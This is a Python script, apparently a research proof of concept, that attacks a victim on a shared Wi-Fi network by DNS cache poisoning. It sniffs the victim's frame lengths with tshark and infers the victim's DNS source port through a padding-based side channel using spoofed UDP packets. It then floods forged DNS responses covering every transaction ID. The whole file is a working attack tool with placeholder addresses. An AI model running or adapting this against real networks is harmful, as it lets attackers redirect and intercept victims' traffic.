import time
import random
import threading
import subprocess
from utils.rawsockets import Rawsockets

src_ip = "x.x.x.x"                # need to change
dst_ip = "x.x.x.x"                # need to change
NIC = "eth0"                      # need to change
victim_mac = "xx:xx:xx:xx:xx:xx"  # need to change

src_port = 12345                  # this param should be inferred
dst_port = 53
WIFI_HEADER_LENGTH = 117          # need to modify by packet capture
CHALLENGE_ACK_LENGTH = 129        # need to modify by packet capture

all_time = 0


def listen_packets(packet_lengths, lock):
    global victim_mac, NIC
    cmd = f"sudo tshark -i {NIC} -Y \"(wlan.fc.type == 2) && (wlan.da == {victim_mac})\" -T fields -e frame.len -l"
    proc = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    print("start listening")
    try:
        while True:
            line = proc.stdout.readline()
            if line:
                packet_length = int(line.strip())
                with lock:
                    packet_lengths.append(packet_length)
    finally:
        proc.terminate()


def check_consecutive_lengths(packet_lengths):
    global CHALLENGE_ACK_LENGTH
    packet_lengths.sort()
    print(packet_lengths)
    for i in range(len(packet_lengths) - 1):
        if packet_lengths[i + 1] - packet_lengths[i] == CHALLENGE_ACK_LENGTH:
            return True, packet_lengths[i + 1]
    return False, 0


def guess_src_port_multi_bin():
    global src_port, dst_port, lock, packet_lengths, all_time
    start_port = 32768
    end_port = 65535
    bin_num = 64
    one_round_per_bin = 25
    time_per_round = 1
    port_range = list(range(start_port, end_port))
    ports_per_bin = len(port_range) // bin_num
    bins = []

    for i in range(bin_num):
        start = i * ports_per_bin
        if i == bin_num - 1:
            end = len(port_range)
        else:
            end = start + ports_per_bin
        bins.append(port_range[start:end])

    reversed_rs = Rawsockets(dst_ip.encode('utf-8'), src_ip.encode('utf-8'))
    tt1 = time.time()
    # phase 1 -> know what bin have the correct Port
    which_bin = 0
    for round in range(bin_num // one_round_per_bin + 1):
        current_ports = []
        padding_lengths = []
        for i in range(round * one_round_per_bin, min((round + 1) * one_round_per_bin, bin_num)):
            current_ports += bins[i]
            padding_lengths += [i - round * one_round_per_bin] * len(bins[i])
        
        with lock:
            packet_lengths[:] = []
        reversed_rs.send_parallel_udp_data(dst_port, current_ports, padding_lengths)
        time.sleep(time_per_round)
        found, packet_size = check_consecutive_lengths(packet_lengths)
        if found:
            which_bin = packet_size - (WIFI_HEADER_LENGTH) + round * one_round_per_bin - 1

    # phase 2 -> know what Port is correct
    current_ports = bins[which_bin]
    padding_lengths = range(len(current_ports))
    with lock:
        packet_lengths[:] = []
    reversed_rs.send_parallel_udp_data(dst_port, current_ports, padding_lengths)
    time.sleep(time_per_round)
    found, packet_size = check_consecutive_lengths(packet_lengths)
    if found:
        src_port = current_ports[packet_size - (WIFI_HEADER_LENGTH) - 1]
        all_time += time.time() - tt1
        print("[+] Time for guess src port: %s" % (all_time))
        print("[+] Guess src port: %s" % (src_port))
    
    with lock:
        packet_lengths[:] = []
    reversed_rs.send_parallel_udp_data(dst_port, [src_port], [1]) 
    time.sleep(2)
    checked, _ = check_consecutive_lengths(packet_lengths)
    if checked:
        print("[+] Checked src port right")
    else:
        print("[-] Checked src port error!!")
        exit(0)
    
    del(reversed_rs)

def inject_dns_response():
    global src_ip, dst_ip, src_port, dst_port
    txids = list(range(0, 0x10000))
    random.shuffle(txids)
    rs = Rawsockets(dst_ip.encode('utf-8'), src_ip.encode('utf-8'), 0)
    rs.send_parallel_dns_response(dst_port, src_port, txids)
    del(rs)

if __name__ == "__main__":
    packet_lengths = []
    lock = threading.Lock()
    listen_thread = threading.Thread(target=listen_packets, args=(packet_lengths, lock))
    listen_thread.start()
    guess_src_port_multi_bin()
    inject_dns_response()
    print("all time: ", all_time)